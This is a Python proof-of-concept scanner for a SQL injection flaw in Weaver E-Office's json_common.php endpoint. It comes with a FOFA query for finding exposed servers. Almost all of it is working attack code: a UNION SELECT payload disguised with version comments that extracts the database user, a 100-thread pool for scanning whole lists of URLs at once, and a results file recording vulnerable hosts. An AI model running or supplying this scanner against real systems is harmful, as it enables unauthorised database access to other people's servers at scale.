# 泛微E-Office json_common.php存在SQL注入漏洞
# fofa:app="泛微-EOffice"

import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php 存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = '/building/json_common.php'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Cookie': 'LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type':'application/x-www-form-urlencoded',
        'Content-Length':'79'
    }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#|2|333"

    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if 'eoffice' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该站点:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()